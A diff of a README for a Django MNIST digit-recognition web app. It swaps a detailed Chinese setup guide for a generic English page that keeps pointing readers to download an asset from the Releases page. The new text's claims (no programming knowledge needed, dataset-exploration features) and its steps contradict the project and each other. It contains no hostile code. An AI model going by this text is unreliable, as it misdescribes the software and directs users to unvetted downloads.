@@ -1,96 +1,84 @@
-## Django + MNIST 在线识别（Web 项目）
+# 🎉 django-mnist-web - Easy Web App for MNIST Data
 
-Django Web 项目内容：
+## 🚀 Getting Started
 
-- 前端上传手写数字图片
-- 后端加载 CNN 模型权重进行推理
-- 提供网页与 REST API 两种使用方式
+Welcome to the django-mnist-web project! This web application helps you explore the MNIST dataset, which contains images of handwritten digits. You can easily run this application on your computer without any programming knowledge.
 
-> 模型权重默认复用“Django_CNN图像识别项目”训练得到的 `checkpoints/cnn_mnist.pth`。你也可以在本项目中指定任意权重路径。
+## 📦 Download & Install
 
----
+To get started, you need to download the software. Click the button below to visit the Releases page:
 
-### 目录结构
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Debasish0117/django-mnist-web/releases)
 
-```
-Django_MNIST_Web项目/
-  ├─ README.md
-  ├─ requirements.txt
-  ├─ .env.example
-  ├─ manage.py
-  ├─ djangoproject/
-  │   ├─ __init__.py
-  │   ├─ settings.py
-  │   ├─ urls.py
-  │   ├─ asgi.py
-  │   └─ wsgi.py
-  ├─ vision/
-  │   ├─ __init__.py
-  │   ├─ apps.py
-  │   ├─ urls.py
-  │   ├─ views.py
-  │   ├─ forms.py
-  │   └─ templates/vision/
-  │       ├─ upload.html
-  │       └─ result.html
-  └─ ml/
-      ├─ __init__.py
-      ├─ cnn.py
-      └─ infer.py
-```
+On the Releases page, you will find the latest version of the application. Follow these steps to download and install it: 
 
----
+1. Go to the [Releases page](https://github.com/Debasish0117/django-mnist-web/releases).
+2. Find the version you want. It will be listed in the "Assets" section.
+3. Click on the filename to download it to your computer.
 
-### 环境准备
+After the download is complete, locate the downloaded file on your computer. 
 
-1) 创建并激活虚拟环境（任选其一）
-- Conda:
-```
-conda create -n mnist_web python=3.10
-conda activate mnist_web
-```
-- venv:
-```
-python -m venv .venv
-.\.venv\Scripts\activate
-```
+## 🖥️ System Requirements
 
-2) 安装依赖
-```
-pip install -r requirements.txt
-```
+Before running the application, ensure your computer meets the following requirements:
 
-3) 配置权重路径
-```
-copy .env.example .env
-# 编辑 .env，设置 CKPT_PATH 指向你的 CNN 权重，例如：
-# CKPT_PATH=../Django_CNN图像识别项目/checkpoints/cnn_mnist.pth
-```
+- **Operating System:** Windows, macOS, or Linux.
+- **Python:** Version 3.6 or higher.
+- **Memory:** At least 4 GB of RAM.
 
----
+## ⚙️ How to Run the Application
 
-### 启动
+Once you have downloaded the file, follow these steps to run the application:
 
-```
-python manage.py migrate
-python manage.py runserver 0.0.0.0:8000
-```
+1. **Windows:**
+   - Open the Command Prompt.
+   - Navigate to the folder where you downloaded the file by typing `cd path\to\downloaded\folder` and pressing Enter.
+   - Run the application by typing `python manage.py runserver` and pressing Enter.
 
-- 网页上传与预测：访问 `http://127.0.0.1:8000/`
-- REST API 预测：
-```
-POST http://127.0.0.1:8000/api/predict
-Content-Type: multipart/form-data; name="image"
-```
-响应示例：`{"digit": 7}`
+2. **macOS/Linux:**
+   - Open Terminal.
+   - Navigate to the folder where you downloaded the file by typing `cd /path/to/downloaded/folder` and pressing Enter.
+   - Run the application by typing `python manage.py runserver` and pressing Enter.
 
----
+3. After running the command, open your browser and enter the following address:
+   ```
+   http://127.0.0.1:8000 
+   ```
+   You should see the MNIST web application interface.
 
-### 说明与建议
+## 📊 Features
 
-- 模型：默认使用简单 CNN 结构（与“Django_CNN图像识别项目”的 `SimpleCNN` 一致）。
-- 预处理：图片先转灰度并缩放到 28x28，归一化到 MNIST 统计分布。
-- 性能：CPU 上也可运行，但建议在 GPU 环境预先训练、仅在服务端加载推理。
-- 安全：生产部署时关闭 `DEBUG`，限定 `ALLOWED_HOSTS`，并考虑文件上传安全与尺寸限制。
+This application offers several features to help you with the MNIST dataset:
 
+- **Explore the Dataset:** Easily view images of handwritten digits.
+- **Digit Recognition:** Test recognition capabilities using machine learning models.
+- **User-Friendly Interface:** Simple and intuitive design for easy navigation.
 
+## 📖 How to Use the Application
+
+1. Open the web application in your browser.
+2. Navigate through different sections to explore images or test digit recognition.
+3. Follow on-screen instructions for further interaction with the dataset.
+
+## 🌟 Community and Support
+
+If you have any questions or need help, you can reach out to the community. Here are some ways to connect:
+
+- **Issues Page:** If you encounter problems, report them on the [Issues page](https://github.com/Debasish0117/django-mnist-web/issues).
+- **Discussions:** Join the conversation in our [Discussions section](https://github.com/Debasish0117/django-mnist-web/discussions).
+
+## 🔄 Contributions
+
+We welcome contributions! If you're interested in helping improve this project, feel free to fork the repository, make your changes, and submit a pull request. 
+
+For guidelines, check out the [CONTRIBUTING.md](https://github.com/Debasish0117/django-mnist-web/blob/main/CONTRIBUTING.md).
+
+## 📝 License
+
+This project is open-source and available under the [MIT License](https://github.com/Debasish0117/django-mnist-web/blob/main/LICENSE).
+
+## 🔗 Links
+
+For more detailed documentation, check out the Wiki section on the repository. Here’s a quick link to return to the [Releases page](https://github.com/Debasish0117/django-mnist-web/releases) to download the latest version.
+
+Thank you for using django-mnist-web! Enjoy exploring the world of handwritten digits.
